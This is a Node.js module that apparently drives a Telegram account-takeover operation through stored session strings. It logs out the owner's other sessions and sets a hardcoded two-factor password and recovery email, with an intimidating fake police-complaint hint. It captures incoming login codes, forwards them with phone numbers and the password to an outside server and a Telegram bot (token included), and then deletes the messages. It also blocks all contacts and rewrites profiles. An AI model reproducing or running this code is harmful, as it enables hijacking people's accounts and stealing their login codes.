const { TelegramClient, Api } = require('telegram');
const { NewMessage } = require("telegram/events/index.js");
const axios = require('axios');
const { StringSession } = require('telegram/sessions');
const { isMailReady, getcode, connectToMail, disconnectfromMail } = require('./mailreader')
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
const { CustomFile } = require("telegram/client/uploads");
const { sleep } = require('./utils')
const fs = require('fs');

const clients = new Map();

let activeClientSetup = undefined
function getActiveClientSetup() {
    return activeClientSetup;
}

function setActiveClientSetup(data) {
    activeClientSetup = data
}

function getClient(number) {
    return clients.get(number);
}

function hasClient(number) {
    return clients.has(number);
}

function deleteClient(number) {
    return clients.delete(number);
}

async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}


async function createClient(number, session, autoDisconnect = true) {
    return new Promise(async (resolve) => {
        const cli = new TelegramManager(session, number);
        await cli.createClient(autoDisconnect);
        if (cli.expired) {
            clients.set(number, cli);
        }
        resolve(cli.expired);
    });
}


class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.expired = false;
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async createClient(autoDisconnect = true) {
        try {
            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            await this.client.connect();
            // const msg = await this.client.sendMessage("777000", { message: "." });
            // await msg.delete({ revoke: true });
            const myMsgs = await this.client.getMessages('me', { limit: 8 });
            if (autoDisconnect) {
                setTimeout(async () => {
                    console.log("SELF destroy client");
                    await this.client.disconnect();
                    await this.client.destroy();
                    this.session.delete();
                    clients.delete(this.phoneNumber);
                }, 180000)
            }
            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
            const chats = await this.client?.getDialogs({ limit: 500 });
            console.log("TotalChats:", chats['total'])
            this.expired = { msgs: myMsgs['total'], total: chats['total'] }
        } catch (error) {
            console.log(error);
            this.expired = undefined;
        }
    }

    async getLastMsgs(limit) {
        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
        let resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }

    async joinChannels(str) {
        const channels = str.split('|');
        for (let i = 0; i < channels.length; i++) {
            const channel = channels[i].trim();
            try {
                let joinResult;
                if (channel.startsWith('@')) {
                    joinResult = await this.client.invoke(
                        new Api.channels.JoinChannel({
                            channel: await this.client.getEntity(channel),
                        })
                    );
                } else {
                    const peerChannel = new Api.PeerChannel({ channelId: bigInt(channel) });
                    joinResult = await this.client.invoke(
                        new Api.channels.JoinChannel({
                            channel: await this.client.getEntity(peerChannel),
                        })
                    );
                }
                console.log("Joined channel Sucess")
            } catch (error) {
                console.log(error);
            }
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
        }
    }
    async removeOtherAuths() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        return result
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async blockAllUsers() {
        const chats = await this.client?.getDialogs({ limit: 600 });
        for (let chat of chats) {
            if (chat.isUser) {
                await this.blockAUser(chat.id)
            }
            sleep(5000);
        }
    }

    async blockAUser(id) {
        const result = await this.client.invoke(
            new Api.contacts.Block({
                id: id,
            })
        );
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }

    async getMe() {
        const me = await this.client.getMe();
        return me
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(result)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            console.log(error)
        }
    }

    async set2fa() {
        connectToMail()
        const intervalParentId = setInterval(async () => {
            const isReady = isMailReady();
            if (isReady) {
                clearInterval(intervalParentId);
                await this.client.updateTwoFaSettings({
                    isCheckPassword: false,
                    email: "storeslaksmi@gmail.com",
                    hint: "Police Complaint Registered for SEX SPAM - Delhi Police",
                    newPassword: "Ajtdmwajt1@",
                    emailCodeCallback: async (length) => {
                        console.log("code sent");
                        return new Promise(async (resolve) => {
                            let retry = 0
                            const intervalId = setInterval(async () => {
                                console.log("checking code");
                                retry++
                                const isReady = isMailReady();
                                if (isReady && retry < 4) {
                                    const code = await getcode();
                                    if (code !== '') {
                                        clearInterval(intervalId);
                                        disconnectfromMail()
                                        resolve(code);
                                    }
                                } else {
                                    clearInterval(intervalId);
                                    await this.client.disconnect();
                                    deleteClient(this.phoneNumber);
                                    disconnectfromMail()
                                    resolve(code);
                                }
                            }, 3000);
                        });
                    },
                    onEmailCodeError: (e) => { console.log(e); return Promise.resolve("error") }
                })
            }
        }, 5000);
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            console.log(e)
        }
    }
    async updateProfile(firstName, about) {
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile({
                    firstName: firstName,
                    lastName: "",
                    about: about,
                })
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            console.log(error)
        }
    }
    async updateUsername(baseUsername) {

        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(error)
            }
        } else {
            while (true) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await sleep(4000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await sleep(10000);
                }
            }
        }
    }

    async updateProfilePic(image) {
        const file = await this.client.uploadFile({
            file: new CustomFile(
                'pic.jpg',
                fs.statSync(
                    image
                ).size,
                image
            ),
            workers: 1,
        });
        console.log("file uploaded- ", file)
        await this.client.invoke(new Api.photos.UploadProfilePhoto({
            file: file,
        }));
        console.log("profile pic updated")
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            console.log(e)
        }
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                if (this.phoneNumber === activeClientSetup.phoneNumber) {
                    console.log("LoginTExt: ", event.message.text)
                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                    console.log("Code is:", code)
                    try {
                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                        console.log("Code Sent");
                    } catch (error) {
                        console.log(error)
                    }
                }
                console.log(event.message.text.toLowerCase());
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios.post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.error('Error sending message:', error.response?.data?.description);
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }
}

module.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient, deleteClient, getActiveClientSetup, setActiveClientSetup }
